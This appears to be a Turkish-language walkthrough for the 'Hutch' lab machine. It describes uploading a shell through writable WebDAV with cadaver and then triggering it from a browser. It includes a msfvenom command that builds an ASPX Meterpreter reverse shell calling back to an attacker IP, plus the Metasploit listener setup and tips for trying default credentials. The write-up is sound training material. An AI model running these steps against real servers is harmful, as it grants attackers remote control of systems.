---
layout: page
title: Hutch - WebDAV Exploitation
permalink: /hutch/
---

# Hutch - WebDAV Exploitation

## 📌 Senaryo
Hutch makinesinde WebDAV servisi etkin durumdadır. Bu zafiyet, saldırganın dosya yükleme işlemleri yoluyla web uygulamasına doğrudan erişim sağlamasını mümkün kılmaktadır.

## 🔍 Keşif Aşaması

**Target belirleme:**
```bash
# Target makinenin IP adresini belirle
ping target.com
```

**Port taraması:**
```bash
nmap -sV target.com
```

WebDAV servisi tipik olarak HTTP (80) veya HTTPS (443) üzerinde çalışmaktadır.

## ⚔️ Saldırı Aşaması - WebDAV Exploitation

**Cadaver kullanarak WebDAV'a erişim:**

```bash
# Attacker machine'den WebDAV'a bağlan
cadaver http://target.com/webdav/
```

Bağlantı kurulduktan sonra prompt açılacaktır:
```
dav:/target.com/webdav/> 
```

**Mevcut dosyaları listele:**
```bash
ls
```

**Dosya yükle:**
```bash
# Shell dosyasını yükle
put shell.aspx

# Başarılı yükleme mesajı
201 Created: http://target.com/webdav/shell.aspx
```

**Web uygulamasından erişim:**

Yüklenen dosya direkt web uygulamasının dizinine gitmektedir:
```
http://target.com/shell.aspx
```

Browser'dan bu URL'ye erişerek yüklenen shell dosyasını çalıştırabilirsiniz.

## 💻 Örnek: Reverse Shell Yükleme

**Attacker makinesi - Shell oluştur:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.XX LPORT=4444 -f aspx -o shell.aspx
```

**Cadaver ile yükle:**
```bash
cadaver http://target.com/webdav/
dav:/target.com/webdav/> put shell.aspx
Copying from shell.aspx: 201 Created: http://target.com/webdav/shell.aspx
```

**Attacker tarafında listener başlat:**
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.49.XX
set LPORT 4444
exploit
```

**Target'ta çalıştır:**
```
http://target.com/shell.aspx
```

## 🛡️ Kontrol

Eğer meterpreter session açıldıysa başarılı demektir:
```
Meterpreter session opened
```

## 🔧 Troubleshooting

| Hata | Çözüm |
|------|-------|
| `401 Unauthorized` | Credentials kontrol et, varsayılan credentials dene |
| `405 Method Not Allowed` | WebDAV PUT method'u devre dışı olabilir |
| `403 Forbidden` | Dosya yükleme dizini protekteli, farklı dizin dene |
| Shell çalışmıyor | Web uygulamasının dosya uzantısını destekleyip desteklemediğini kontrol et |

## 📋 Kontrol Listesi

- [ ] Target'te WebDAV servisi çalışıyor mu?
- [ ] Cadaver ile WebDAV'a bağlandım
- [ ] Dosya yükleyebiliyorum
- [ ] Yüklenen dosyaya web'den erişebiliyorum
- [ ] Shell dosyası çalışıyor
- [ ] Reverse shell bağlantısı kurdum
